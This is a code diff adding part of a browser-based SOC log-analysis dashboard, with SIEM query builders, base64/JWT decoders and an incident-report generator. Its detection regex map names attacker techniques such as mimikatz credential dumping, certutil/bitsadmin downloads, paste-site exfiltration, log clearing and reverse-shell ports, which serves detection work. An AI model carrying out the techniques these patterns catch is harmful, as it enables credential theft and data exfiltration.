+    <div class="tool-block"><h4>Base64 strings → decoded preview</h4>
+      ${b64s.map(x=>`<div class="tool-panel" style="padding:10px 14px;"><div style="font-family:var(--mono);font-size:11px;color:var(--text-faint);">${esc((x.src.cmd||"").slice(0,60))}…</div><div class="decoded-box">${esc(x.dec)}</div></div>`).join("")||`<div class="empty-state" style="padding:14px 0;">No decodable base64 found in command lines.</div>`}
+    </div>
+    <div class="tool-block"><h4>JWTs → decode</h4>
+      ${jwts.map(j=>`<div class="tool-panel" style="padding:10px 14px;"><div style="font-family:var(--mono);font-size:10.5px;color:var(--text-faint);">${esc(j.raw.slice(0,60))}…</div><div class="decoded-box">header: ${esc(JSON.stringify(j.header))}\npayload: ${esc(JSON.stringify(j.payload))}</div></div>`).join("")||`<div class="empty-state" style="padding:14px 0;">No JWTs found.</div>`}
+    </div>
+    <div class="tool-block"><h4>Emails → copy</h4>
+      ${emails.map(e=>`<span class="tool-chip" onclick="copyText('${esc(e)}',this)">${esc(e)} <span class="op">copy</span></span>`).join("")||"—"}
+    </div>
+    <div class="tool-block"><h4>Registry keys → copy</h4>
+      ${regKeys.map(k=>`<span class="tool-chip" onclick="copyText('${esc(k)}',this)">${esc(k.slice(0,50))}${k.length>50?"…":""} <span class="op">copy</span></span>`).join("")||"—"}
+    </div>
+    <footer class="note">All parsing (base64, JWT, subnet math, defanging) runs locally in your browser. No values are sent anywhere. Reputation flags are heuristic co-occurrence with a fired rule, not a verdict — confirm against your threat-intel platform before action.</footer>
+  `;
+}
+window.copyText = copyText;
+
+/* ================= QUERY BUILDERS ================= */
+const PLATFORMS = [
+  {id:"crowdstrike", name:"CrowdStrike FQL", lang:"LogScale"},
+  {id:"panther", name:"Panther Queries", lang:"Panther SQL"},
+  {id:"splunk", name:"Splunk SPL", lang:"SPL"},
+  {id:"sentinel", name:"Sentinel KQL", lang:"KQL"},
+  {id:"qradar", name:"QRadar AQL", lang:"AQL"},
+  {id:"s1", name:"SentinelOne PQ", lang:"PowerQuery"},
+];
+function ruleToQuery(rule, platform){
+  const tech = rule.technique;
+  switch(platform){
+    case "crowdstrike":
+      return `#event_simpleName=ProcessRollup2\n| FileName=/${procHint(rule)}/i\n| CommandLine=/${cmdHint(rule)}/i\n| table([ComputerName, UserName, ParentBaseFileName, CommandLine, SHA256HashData], limit=200)\n// ${rule.title} · ATT&CK ${tech}`;
+    case "panther":
+      return `SELECT p_event_time, host, user, parent_process, process_name, command_line\nFROM panther_logs.process_events\nWHERE p_occurs_since('7d')\n  AND REGEXP_LIKE(command_line, '${cmdHint(rule)}')\n-- ${rule.title} · ATT&CK ${tech}`;
+    case "splunk":
+      return `index=edr sourcetype=process_creation\n| regex CommandLine="${cmdHint(rule)}"\n| table _time, ComputerName, User, ParentImage, Image, CommandLine\n| sort -_time\n\`\`\` ${rule.title} · ATT&CK ${tech} \`\`\``;
+    case "sentinel":
+      return `DeviceProcessEvents\n| where Timestamp > ago(7d)\n| where ProcessCommandLine matches regex @"${cmdHint(rule)}"\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n// ${rule.title} · ATT&CK ${tech}`;
+    case "qradar":
+      return `SELECT DATEFORMAT(devicetime,'YYYY-MM-dd HH:mm:ss') AS time, sourceip, username, "Command Line"\nFROM events\nWHERE "Command Line" IMATCHES '${cmdHint(rule)}'\nLAST 7 DAYS\n-- ${rule.title} · ATT&CK ${tech}`;
+    case "s1":
+      return `event.type = "Process Creation"\n| filter process.cmdline matches "${cmdHint(rule)}"\n| columns endpoint.name, user.name, process.parent.name, process.name, process.cmdline\n// ${rule.title} · ATT&CK ${tech}`;
+  }
+  return "";
+}
+function procHint(rule){ return "(?i)" + rule.title.split(" ")[0]; }
+function cmdHint(rule){
+  const map = {
+    enc_powershell:"powershell.*-(enc|encodedcommand)",
+    lsass_dump:"mimikatz|sekurlsa|privilege::debug",
+    psexec:"psexec|paexec|admin\\$",
+    reg_run_persist:"reg(\\.exe)?\\s+add.*\\\\(run|runonce)",
+    sched_task_persist:"schtasks.*\\/create",
+    lolbin_download:"certutil.*-urlcache|bitsadmin.*\\/transfer|curl\\s+-o",
+    discovery_cmds:"whoami|net user \\/domain|systeminfo",
+    susp_child:"cmd\\.exe|powershell\\.exe|mshta\\.exe|rundll32\\.exe",
+    wmi_winrm:"wmic.*process call create|invoke-command",
+    susp_port:"4444|1337|31337",
+    susp_tld_dns:"\\.(xyz|top|tk|zip|gq|cf|ml|ga)$",
+    cleartext_pw:"password[=:]|\\/pass(word)?:",
+    clear_logs:"wevtutil\\s+cl|clear-eventlog",
+    exfil_paste:"pastebin\\.com|transfer\\.sh|anonfiles",
+  };
+  return map[rule.id] || rule.technique;
+}
+let qbState = {};
+function buildQueryBuilders(){
+  PLATFORMS.forEach(p=>{
+    qbState[p.id] = qbState[p.id] || { active: RULES[0].id };
+    document.getElementById("qb-mount-"+p.id).innerHTML = qbLayout(p);
+  });
+}
+function qbLayout(p){
+  const active = RULES.find(r=>r.id===qbState[p.id].active) || RULES[0];
+  const cats = [...new Set(RULES.map(r=>r.tactic))];
+  const list = cats.map(cat=>{
+    const items = RULES.filter(r=>r.tactic===cat).map(r=>{
+      const hits = DET_HITS.filter(h=>h.rule.id===r.id).length;
+      return `<div class="qb-item ${r.id===active.id?'active':''}" onclick="qbSelect('${p.id}','${r.id}')">
+        <span style="display:flex;align-items:center;"><i class="sev-dot" style="background:${sevColor[r.severity]}"></i>${esc(r.title)}</span>
+        <span style="color:var(--text-faint);font-size:10px;">${hits||''}</span>
+      </div>`;
+    }).join("");
+    return `<div class="qb-cat">${esc(cat)}</div>${items}`;
+  }).join("");
+  return `<div class="view-head"><div><h2>${esc(p.name)}</h2><p>Auto-generated ${p.lang} queries from your loaded rule pack — review before running in production.</p></div></div>
+  <div class="qb-layout">
+    <div class="qb-list"><div class="qb-search"><input placeholder="Search ${RULES.length} queries — title, ATT&CK ID..." oninput="qbFilter('${p.id}',this.value)"></div><div id="qb-list-${p.id}">${list}</div></div>
+    <div class="qb-detail">
+      <h3>${esc(active.title)}</h3>
+      <div class="desc">${esc(active.desc.slice(0,180))}</div>
+      <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
+        <span class="sev-tag sev-${active.severity}">${active.severity}</span>
+        <span class="pill">${esc(active.tactic)}</span>
+        <span class="pill">ATT&amp;CK ${esc(active.technique)}</span>
+      </div>
+      <div class="qb-code">${esc(ruleToQuery(active,p.id))}</div>
+      <div style="margin-top:12px;display:flex;gap:8px;">
+        <button class="btn" onclick="copyText(${JSON.stringify(ruleToQuery(active,p.id))},this)">Copy query</button>
+        <button class="btn ghost" onclick="setTableFilter('')">View matching events</button>
+      </div>
+    </div>
+  </div>`;
+}
+window.qbSelect = function(pid, ruleId){ qbState[pid].active = ruleId; document.getElementById("qb-mount-"+pid).innerHTML = qbLayout(PLATFORMS.find(p=>p.id===pid)); };
+window.qbFilter = function(pid, text){
+  const p = PLATFORMS.find(x=>x.id===pid);
+  const listEl = document.getElementById("qb-list-"+pid);
+  if(!text){ listEl.innerHTML = listEl.innerHTML; buildOneQb(pid); return; }
+  const filtered = RULES.filter(r=> (r.title+" "+r.technique).toLowerCase().includes(text.toLowerCase()));
+  listEl.innerHTML = filtered.map(r=>`<div class="qb-item ${r.id===qbState[pid].active?'active':''}" onclick="qbSelect('${pid}','${r.id}')"><span style="display:flex;align-items:center;"><i class="sev-dot" style="background:${sevColor[r.severity]}"></i>${esc(r.title)}</span></div>`).join("") || `<div class="matrix-empty">No matches</div>`;
+};
+function buildOneQb(pid){ document.getElementById("qb-mount-"+pid).innerHTML = qbLayout(PLATFORMS.find(p=>p.id===pid)); }
+
+/* ================= INCIDENT REPORT ================= */
+function renderReport(){
+  const el = document.getElementById("reportBody");
+  if(!RAW_EVENTS.length){ el.innerHTML = `<div class="empty-state">Load logs to generate an incident report.</div>`; return; }
+
+  const sevCounts = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  RAW_EVENTS.forEach(e=> sevCounts[e.severity] !== undefined ? sevCounts[e.severity]++ : sevCounts.LOW++ );
+  const hosts = new Set(RAW_EVENTS.map(e=>e.host).filter(Boolean));
+  const users = new Set(RAW_EVENTS.map(e=>e.user).filter(Boolean));
+  const times = RAW_EVENTS.map(e=>new Date(e.time)).filter(d=>!isNaN(d));
+  const windowStart = times.length? new Date(Math.min(...times)) : null;
+  const windowEnd = times.length? new Date(Math.max(...times)) : null;
+  const threatLevel = sevCounts.CRITICAL>0 ? "CRITICAL" : sevCounts.HIGH>0 ? "HIGH" : "MEDIUM";
+  const tactics = [...new Set(DET_HITS.map(h=>h.rule.tactic))];
+
+  const byUser = {};
+  DET_HITS.forEach(h=>{ const u=h.event.user||"(unknown)"; (byUser[u]=byUser[u]||[]).push(h); });
+  const chains = Object.entries(byUser).sort((a,b)=>b[1].length-a[1].length);
+
+  const byRule = {};
+  DET_HITS.forEach(h=>{ (byRule[h.rule.id]=byRule[h.rule.id]||{rule:h.rule,items:[]}).items.push(h.event); });
+  const findings = Object.values(byRule).sort((a,b)=>b.items.length-a.items.length);
+
+  const recActions = [];
+  if(tactics.includes("Credential Access")) recActions.push({pr:"P1",t:"Force credential reset for all users/hosts flagged under Credential Access, and hunt for LSASS access on affected endpoints."});
+  if(tactics.includes("Persistence")) recActions.push({pr:"P1",t:"Review and remove unauthorized Run-key entries and scheduled tasks identified in Persistence findings."});
+  if(tactics.includes("Lateral Movement")) recActions.push({pr:"P2",t:"Audit admin-share and PsExec/WMI usage; restrict lateral movement paths via network segmentation."});
+  if(tactics.includes("Command and Control")) recActions.push({pr:"P1",t:"Block flagged C2 domains/IPs at the perimeter and rotate any exposed credentials sent over those channels."});
+  if(tactics.includes("Defense Evasion")) recActions.push({pr:"P2",t:"Re-enable and centralize event logging on hosts where log clearing was observed; investigate the gap."});
+  if(tactics.includes("Exfiltration")) recActions.push({pr:"P1",t:"Determine what data reached flagged paste/file-share destinations and notify data owners."});
+  recActions.push({pr:"P3",t:"Re-run this rule pack after remediation to confirm no further matches."});
+
+  el.innerHTML = `
+    <div class="report-header">
+      <div><h1>Incident Report</h1><div class="id">IR-${new Date().toISOString().slice(0,10).replace(/-/g,"")}-${String(DET_HITS.length).padStart(4,"0")}</div>
+        <div class="threat-badge ${threatLevel}">THREAT LEVEL: ${threatLevel}</div></div>
+      </div>
+    <div class="report-meta-row">
+      <span><b>Generated</b> ${new Date().toISOString().replace("T"," ").slice(0,19)} UTC</span>
+      <span><b>Window</b> ${windowStart?fmtTime(windowStart):"—"} → ${windowEnd?fmtTime(windowEnd):"—"}</span>
+      <span><b>Events</b> ${RAW_EVENTS.length}</span>
+      <span><b>Detections</b> ${DET_HITS.length}</span>
+    </div>
+
+    <div class="report-sec" id="rsec-summary"><h2>1 · Executive Summary</h2>
+      <p>This report covers ${RAW_EVENTS.length} events across ${hosts.size} host${hosts.size===1?"":"s"} and ${users.size} user${users.size===1?"":"s"}, producing ${DET_HITS.length} rule matches
+      (${sevCounts.CRITICAL} critical, ${sevCounts.HIGH} high, ${sevCounts.MEDIUM} medium, ${sevCounts.LOW} low). Activity spans ${tactics.length} MITRE ATT&amp;CK tactic${tactics.length===1?"":"s"}:
+      ${tactics.map(esc).join(", ")||"none"}. ${chains.length} distinct chain${chains.length===1?"":"s"} of correlated activity ${chains.length===1?"was":"were"} identified (Section 3), plus ${CORR_HITS.length} cross-event correlation${CORR_HITS.length===1?"":"s"} such as bursts, sweeps, and baseline anomalies (Section 4).</p>
+    </div>
+
+    <div class="report-sec" id="rsec-timeline"><h2>2 · Incident Timeline</h2>
+      <div id="rsecTimelineBars">${["CRITICAL","HIGH","MEDIUM","LOW"].map(s=>`<div class="bar-row"><span class="label">${s}</span><div class="bar-track"><div class="bar-fill" style="width:${(sevCounts[s]/(RAW_EVENTS.length||1))*100}%;background:${sevColor[s]}"></div></div><span class="count">${sevCounts[s]}</span></div>`).join("")}</div>
+    </div>
+
+    <div class="report-sec" id="rsec-chains"><h2>3 · Correlated Attack Chains</h2>
+      ${chains.map(([user,hits])=>{ hits=hits.slice().sort((a,b)=>new Date(a.event.time)-new Date(b.event.time));
+        return `<p><b>${esc(user)}</b> — ${hits.length} flagged events across ${new Set(hits.map(h=>h.event.host)).size} hosts, spanning tactics: ${[...new Set(hits.map(h=>h.rule.tactic))].join(", ")}.</p>`; }).join("") || "<p>No correlated chains.</p>"}
+    </div>
+
+    <div class="report-sec" id="rsec-corr"><h2>4 · Cross-Event Correlations</h2>
+      ${CORR_HITS.length ? CORR_HITS.map(c=>`<p><b>${esc(c.title)}</b> (${c.severity}) — ${esc(c.detail)}</p>`).join("") : "<p>No multi-event correlations found. See the Correlations view — adding a watchlist or IP intel unlocks additional checks.</p>"}
+    </div>
+
+    <div class="report-sec" id="rsec-findings"><h2>5 · Detection Findings</h2>
+      ${findings.map(d=>`<p><b>${esc(d.rule.title)}</b> (${d.rule.severity}, ATT&amp;CK ${esc(d.rule.technique)}${d.rule.custom?', custom rule':''}) — ${d.items.length} matching event(s) across ${new Set(d.items.map(e=>e.host)).size} host(s).<br><span style="color:var(--text-faint);">Suggested response: ${esc(d.rule.playbook||"")}</span></p>`).join("") || "<p>No rules fired.</p>"}
+    </div>
+
+    <div class="report-sec" id="rsec-mitre"><h2>6 · MITRE ATT&amp;CK Coverage</h2>
+      <p>Tactics observed: ${tactics.map(esc).join(", ")||"none"}. Full technique-level matrix and a downloadable ATT&amp;CK Navigator layer are available above and in the MITRE ATT&amp;CK view.</p>
+    </div>
+
+    <div class="report-sec" id="rsec-ueba"><h2>7 · Behavioral Risk (UEBA)</h2>
+      <p>Top risk entities are ranked in the UEBA view using a severity-weighted scoring model (Critical=40, High=15, Medium=5, Low=1 point per detection or correlation), with peer-group baselining (service / privileged / standard accounts) flagging entities more than 2× their peer group's average. Full breakdown available there.</p>
+    </div>
+
+    <div class="report-sec" id="rsec-hunt"><h2>8 · Threat-Hunt Findings</h2>
+      ${HUNT_PACK.map(h=>{ const n=h.test(); return n>0 ? `<p><b>${esc(h.title)}</b> — ${n} matches. ${esc(h.hyp)}</p>` : ""; }).join("") || "<p>No proactive hunt hypotheses returned matches.</p>"}
+    </div>
+
+    <div class="report-sec" id="rsec-assets"><h2>9 · Affected Assets</h2>
+      <p>Hosts: ${[...hosts].map(esc).join(", ")||"none"}</p>
+      <p>Users: ${[...users].map(esc).join(", ")||"none"}</p>
+    </div>
+
+    <div class="report-sec" id="rsec-ioc"><h2>10 · Indicators of Compromise</h2>
+      <p>IPs: ${[...new Set(RAW_EVENTS.flatMap(e=>[e.src_ip,e.dst_ip]).filter(Boolean))].map(esc).join(", ")||"none"}</p>
+      <p>Domains: ${[...new Set(RAW_EVENTS.map(e=>e.domain).filter(Boolean))].map(d=>esc(defang(d))).join(", ")||"none"}</p>
+      <p>Hashes: ${[...new Set(RAW_EVENTS.map(e=>e.hash).filter(Boolean))].map(esc).join(", ")||"none"}</p>
+      <p style="color:var(--text-faint);">Use the buttons above to export this list as a MITRE ATT&amp;CK Navigator layer or a STIX 2.1 indicator bundle.</p>
+    </div>
+
+    <div class="report-sec" id="rsec-actions"><h2>11 · Recommended Actions</h2>
+      ${recActions.map(a=>`<div class="action-item"><span class="pr sev-tag sev-${a.pr==='P1'?'CRITICAL':a.pr==='P2'?'HIGH':'MEDIUM'}">${a.pr}</span><span>${esc(a.t)}</span></div>`).join("")}
+    </div>
+
+    <footer class="note">Generated entirely offline from the loaded logs. This report is a heuristic rule-pack summary, not a formal forensic determination — validate findings before external distribution.</footer>
+  `;
+}
+
+/* ================= NAV / EVENTS ================= */
+document.querySelectorAll(".nav-item[data-view]").forEach(el=>{
+  el.addEventListener("click", ()=>{
+    document.querySelectorAll(".nav-item").forEach(n=>n.classList.remove("active"));
+    el.classList.add("active");
+    document.querySelectorAll(".view").forEach(v=>v.classList.add("hidden"));
+    document.getElementById("view-"+el.dataset.view).classList.remove("hidden");
+  });
+});
+
+function loadEvents(events){
+  RAW_EVENTS = events;
+  DET_HITS = runDetections(events);
+  FIM_EVENTS = []; FIM_HITS = [];
+  document.getElementById("uploadError").textContent = "";
+  render();
+  document.querySelector('[data-view="dashboard"]').click();
+}
+
+function ingestRawItems(items){
+  const fimRaw = items.filter(looksLikeFim);
+  const regularRaw = items.filter(i=>!looksLikeFim(i));
+  document.getElementById("uploadError").textContent = "";
+
+  if(regularRaw.length){ RAW_EVENTS = regularRaw.map(normalizeEvent); DET_HITS = runDetections(RAW_EVENTS); }
+  else { RAW_EVENTS = []; DET_HITS = []; }
+
+  if(fimRaw.length){ FIM_EVENTS = fimRaw.map(normalizeFimEvent); FIM_HITS = runFimDetections(FIM_EVENTS); }
+  else { FIM_EVENTS = []; FIM_HITS = []; }
+
+  render();
+  if(fimRaw.length && !regularRaw.length){ document.querySelector('[data-view="fim"]').click(); }
+  else { document.querySelector('[data-view="dashboard"]').click(); }
+}
+
+function loadFimEvents(rawEvents){
+  FIM_EVENTS = rawEvents.map(normalizeFimEvent);
+  FIM_HITS = runFimDetections(FIM_EVENTS);
+  document.getElementById("uploadError").textContent = "";
+  render();
+  document.querySelector('[data-view="fim"]').click();
+}
+
+document.getElementById("browseBtn").onclick = ()=> document.getElementById("fileInput").click();
+document.getElementById("fileInput").onchange = (ev)=>{
+  const files = Array.from(ev.target.files||[]); if(!files.length) return;
+  Promise.all(files.map(f=> new Promise((resolve)=>{
+    const reader = new FileReader();
+    reader.onload = ()=>{ try{ resolve(parseInput(reader.result, f.name)); }catch(err){ resolve([]); } };
+    reader.readAsText(f);
+  }))).then(results=>{
+    const merged = results.flat();
+    if(!merged.length){ document.getElementById("uploadError").textContent = "⚠ Could not parse any of the selected files."; return; }
+    ingestRawItems(merged);
+  });
+};
+
+const dz = document.getElementById("dropzone");
+dz.addEventListener("dragover", e=>{ e.preventDefault(); dz.style.borderColor="var(--accent)"; });
+dz.addEventListener("dragleave", ()=> dz.style.borderColor="var(--border)");
+dz.addEventListener("drop", e=>{
+  e.preventDefault(); dz.style.borderColor="var(--border)";
+  const files = Array.from(e.dataTransfer.files||[]); if(!files.length) return;
+  Promise.all(files.map(f=> new Promise((resolve)=>{
+    const reader = new FileReader();
+    reader.onload = ()=>{ try{ resolve(parseInput(reader.result, f.name)); }catch(err){ resolve([]); } };
+    reader.readAsText(f);
+  }))).then(results=>{
+    const merged = results.flat();
+    if(!merged.length){ document.getElementById("uploadError").textContent = "⚠ Could not parse the dropped file(s)."; return; }
+    ingestRawItems(merged);
+  });
+});
+
+document.getElementById("sampleBtn").onclick = ()=> loadEvents(buildSampleData());
+document.getElementById("fimSampleBtn").onclick = ()=> loadFimEvents(buildFimSampleData());
+document.getElementById("loadPasteBtn").onclick = ()=>{
+  const txt = document.getElementById("pasteBox").value;
+  if(!txt.trim()){ document.getElementById("uploadError").textContent = "⚠ Paste box is empty."; return; }
+  try{ ingestRawItems(parseInput(txt)); } catch(err){ document.getElementById("uploadError").textContent = "⚠ "+err.message; }
+};
+document.getElementById("clearPasteBtn").onclick = ()=> document.getElementById("pasteBox").value="";
+document.getElementById("resetBtn").onclick = ()=>{
+  RAW_EVENTS=[]; DET_HITS=[]; CORR_HITS=[]; disabledRules.clear(); ackedRuleIds.clear();
+  FIM_EVENTS=[]; FIM_HITS=[];
+  wlIps=[]; wlDomains=[]; ipIntel={};
+  for(let i=RULES.length-1;i>=0;i--) if(RULES[i].custom) RULES.splice(i,1);
+  if(document.getElementById("wlInput")) document.getElementById("wlInput").value="";
+  if(document.getElementById("intelInput")) document.getElementById("intelInput").value="";
+  render(); document.querySelector('[data-view="upload"]').click();
+};
+
+document.getElementById("tableSearch").addEventListener("input", e=>{ tableFilterText = e.target.value; renderTable(); });
+document.getElementById("sevFilter").addEventListener("change", e=>{ tableFilterSev = e.target.value; renderTable(); });
+document.getElementById("presetSelect").addEventListener("change", e=>{ if(e.target.value) applyPreset(e.target.value); });
+document.getElementById("savePresetBtn").addEventListener("click", savePresetPrompt);
+document.querySelectorAll("#logTable thead th[data-k]").forEach(th=>{
+  th.addEventListener("click", ()=>{
+    const k = th.dataset.k;
+    if(tableSortKey===k) tableSortDir*=-1; else { tableSortKey=k; tableSortDir=1; }
+    renderTable();
+  });
+});
+
+document.getElementById("showAckedChk").addEventListener("change", e=>{ showAcked = e.target.checked; renderDetections(); });
+
+document.getElementById("wlApplyBtn").addEventListener("click", applyWatchlist);
+document.getElementById("wlClearBtn").addEventListener("click", ()=>{ document.getElementById("wlInput").value=""; applyWatchlist(); });
+document.getElementById("intelApplyBtn").addEventListener("click", applyIntel);
+document.getElementById("intelClearBtn").addEventListener("click", ()=>{ document.getElementById("intelInput").value=""; applyIntel(); });
+
+document.getElementById("applyRepKeysBtn").addEventListener("click", applyRepKeys);
+if(repApiKeys.vt) document.getElementById("vtKeyInput").value = repApiKeys.vt;
+if(repApiKeys.abuseipdb) document.getElementById("abuseKeyInput").value = repApiKeys.abuseipdb;
+if(repApiKeys.vt || repApiKeys.abuseipdb) document.getElementById("rememberKeysChk").checked = true;
+
+document.getElementById("manualRepScoreBtn").addEventListener("click", ()=>{
+  const lines = (document.getElementById("manualRepInput").value||"").split("\n").map(l=>l.trim()).filter(Boolean);
+  manualRepIndicators = [...new Set(lines)];
+  renderManualReputation();
+});
+document.getElementById("manualRepClearBtn").addEventListener("click", ()=>{
+  document.getElementById("manualRepInput").value = "";
+  manualRepIndicators = [];
+  renderManualReputation();
+});
+
+document.getElementById("sigmaCompileBtn").addEventListener("click", ()=>{
+  const txt = document.getElementById("sigmaInput").value;
+  const resultEl = document.getElementById("sigmaResult");
+  if(!txt.trim()){ resultEl.innerHTML = `<div class="sigma-err">Paste a Sigma rule first.</div>`; return; }
+  const res = compileSigma(txt);
+  if(res.error){ resultEl.innerHTML = `<div class="sigma-err">${esc(res.error)}</div>`; return; }
+  RULES.push(res.rule);
+  DET_HITS = runDetections(RAW_EVENTS);
+  resultEl.innerHTML = `<div class="sigma-ok">Added rule "${esc(res.rule.title)}" (${res.rule.severity}, ${esc(res.rule.tactic)}).${res.rule.warning? " "+esc(res.rule.warning):""}</div>`;
+  render();
+});
+document.getElementById("sigmaClearBtn").addEventListener("click", ()=>{ document.getElementById("sigmaInput").value=""; document.getElementById("sigmaResult").innerHTML=""; });
+
+document.getElementById("sessionBtn").addEventListener("click", (e)=>{
+  e.stopPropagation();
+  const dd = document.getElementById("sessionDropdown");
+  const willShow = dd.classList.contains("hidden");
+  dd.classList.toggle("hidden");
+  if(willShow) renderSessionDropdown();
+});
+document.addEventListener("click", (e)=>{
+  const dd = document.getElementById("sessionDropdown");
+  if(dd && !dd.classList.contains("hidden") && !dd.contains(e.target) && e.target.id!=="sessionBtn"){ dd.classList.add("hidden"); }
+});
+
+document.getElementById("exportBtn").onclick = ()=>{
+  if(!RAW_EVENTS.length){ alert("No events loaded."); return; }
+  const headers = ["time","severity","host","user","process","parent","cmd","src_ip","dst_ip","dst_port","proto","domain","hash"];
+  const csv = [headers.join(",")].concat(RAW_EVENTS.map(e=> headers.map(h=>`"${String(e[h]||"").replace(/"/g,'""')}"`).join(","))).join("\n");
+  const blob = new Blob([csv], {type:"text/csv"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob); a.download = "soc_log_export.csv"; a.click();
+};
+
+render();
+</script>
+</body>
+</html>
